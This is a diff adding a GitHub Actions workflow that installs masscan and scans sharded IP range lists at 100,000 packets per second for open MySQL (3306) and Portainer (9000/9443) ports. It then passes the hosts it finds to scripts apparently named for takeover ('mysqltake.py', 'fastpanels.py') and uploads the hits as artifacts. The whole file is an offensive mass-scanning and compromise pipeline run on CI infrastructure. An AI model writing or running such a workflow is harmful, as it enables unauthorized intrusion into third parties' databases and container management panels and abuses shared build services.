@@ -1,0 +1,57 @@
+name: fullmisc2
+on: workflow_dispatch
+jobs:
+  mysql:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan
+      - run: |
+          : > m_all.txt
+          for r in $(cat r4_${{ matrix.shard }}.txt); do
+            sudo masscan $r -p3306 --rate 100000 -oL m1.txt --wait 0 >/dev/null 2>&1 || true
+            cat m1.txt >> m_all.txt 2>/dev/null || true
+          done
+          awk '$1=="open"{print $4":"$3}' m_all.txt | sort -u > my_hosts.txt
+          echo "mysql hosts: $(wc -l < my_hosts.txt)"
+          python3 mysqltake.py my_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: my2-${{ matrix.shard }}
+          path: |
+            /tmp/mysql_hits.json
+            my_hosts.txt
+          if-no-files-found: warn
+  portainer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - run: |
+          : > p_all.txt
+          for r in $(cat r4_${{ matrix.shard }}.txt); do
+            sudo masscan $r -p9000 -p9443 --rate 100000 -oL p1.txt --wait 0 >/dev/null 2>&1 || true
+            cat p1.txt >> p_all.txt 2>/dev/null || true
+          done
+          awk '$1=="open"{print $4":"$3}' p_all.txt | sort -u > pt_hosts.txt
+          echo "portainer hosts: $(wc -l < pt_hosts.txt)"
+          python3 fastpanels.py pt_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: pt2-${{ matrix.shard }}
+          path: |
+            /tmp/fastpanels.json
+            pt_hosts.txt
+          if-no-files-found: warn
